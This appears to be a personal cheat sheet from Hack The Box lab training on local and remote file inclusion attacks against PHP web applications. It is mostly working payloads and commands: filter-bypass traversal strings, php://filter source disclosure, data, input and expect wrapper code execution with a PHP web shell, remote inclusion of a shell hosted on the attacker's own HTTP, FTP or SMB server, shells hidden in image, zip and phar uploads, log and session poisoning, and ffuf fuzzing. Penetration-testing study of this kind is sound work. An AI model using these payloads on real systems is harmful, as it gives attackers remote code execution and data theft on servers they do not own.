## Info



## Enumeration

- `/etc/passwd`
- `C:\Windows\boot.ini`

We read a file by specifying its absolute path

Furthermore, any prefix appended to our input may break some file inclusion techniques

**Appending Extensions**

`include($_GET['language'] . ".php");`

**Second order attacks**

web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). This is why this attack is called a Second-Order attack.

## Bypasses

`$language = str_replace('../', '', $_GET['language']);`:`..././`,`....//`,`....\/`

**Encoding**

Some web filters may prevent input filters that include certain LFI-related characters, like a dot . or a slash / used for path traversals. 

**Path Truncation**(before 5.3/5.4)

`XeroCyb3r@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done`

**Null Bytes**

`/etc/passwd%00`>>>>`/etc/passwd%00.php`

Certainly, here are the commands extracted from the provided information under each section:

### PHP Filters

#### Input Filters

```
# Fuzzing for PHP files using ffuf
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.62.49:51342/FUZZ.php
```

#### Source Code Disclosure

```
# Using the base64 PHP filter for source code disclosure
php://filter/read=convert.base64-encode/resource=config

# Decoding base64-encoded PHP source code
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

### PHP Wrappers

#### Data Wrapper

```
# Checking PHP configurations for allow_url_include
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Base64 encoding PHP code for data wrapper
echo '<?php system($_GET["cmd"]); ?>' | base64

# Executing PHP code remotely using data wrapper
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

#### Input Wrapper

```
# Executing PHP code using input wrapper (POST request)
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

#### Expect Wrapper

```bash
# Checking if expect wrapper is installed on the server
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect

# Executing commands using expect wrapper
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

# Remote File Inclusion (RFI)

1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host

| Function | Read Content | Execute | Remote URL |
| --- | --- | --- | --- |
| PHP |  |  |  |
| include()/include_once() | ✅ | ✅ | ✅ |
| file_get_contents() | ✅ | ❌ | ✅ |
| Java |  |  |  |
| import | ✅ | ✅ | ✅ |
| .NET |  |  |  |
| @Html.RemotePartial() | ✅ | ❌ | ✅ |
| include | ✅ | ✅ | ✅ |

1. The vulnerable function may not allow including remote URLs
2. You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.

`XeroCyb3r@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include`

`XeroCyb3r@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php`

- `XeroCyb3r@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>`:`http://<LISTENING_IP>:<LISTENING_PORT>/shell.php&cmd=id`
- `sudo python -m pyftpdlib -p 21`:`ftp://kali:kali@94.237.58.109/shell.php&cmd=id`
- `impacket-smbserver -smb2support share $(pwd)`:`\\<OUR_IP>\share\shell.php&cmd=whoami`

## Image File Uploads

| Function | Read Content | Execute | Remote URL |
| --- | --- | --- | --- |
| PHP |  |  |  |
| include()/include_once() | ✅ | ✅ | ✅ |
| require()/require_once() | ✅ | ✅ | ❌ |
| NodeJS |  |  |  |
| res.render() | ✅ | ✅ | ❌ |
| Java |  |  |  |
| import | ✅ | ✅ | ✅ |
| .NET |  |  |  |
| include | ✅ | ✅ | ✅ |

`XeroCyb3r@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`

## Zip Uploads

`XeroCyb3r@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`

`zip://./profile_images/shell.jpg%23shell.php&cmd=id`

## Phar Upload

```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

`XeroCyb3r@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`

`phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`

## Log Poisoning 

| Function | Read Content | Execute | Remote URL |
| --- | --- | --- | --- |
| PHP |  |  |  |
| include()/include_once() | ✅ | ✅ | ✅ |
| require()/require_once() | ✅ | ✅ | ❌ |
| NodeJS |  |  |  |
| res.render() | ✅ | ✅ | ❌ |
| Java |  |  |  |
| import | ✅ | ✅ | ✅ |
| .NET |  |  |  |
| include | ✅ | ✅ | ✅ |

**Session Poisoning**

`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<session>&cmd=id`

**Server Log Poisoning**

`XeroCyb3r@htb[/htb]$ curl -s "http://94.237.63.238:48763/index.php" -A "<?php system(pwd); ?>"`

The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

**Fuzzing Parameters**

`XeroCyb3r@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`

**Lfi FFuf**

`XeroCyb3r@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`

To do so, we can fuzz for the `index.php` file through common webroot paths, which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwords.

`XeroCyb3r@htb[/htb]**$** ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287`

`XeroCyb3r@htb[/htb]**$** ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`

If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of `seclists`, so we need to download them first.

The most common LFI tools are LFISuite, LFiFreak, and liffy.



## Attacking

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

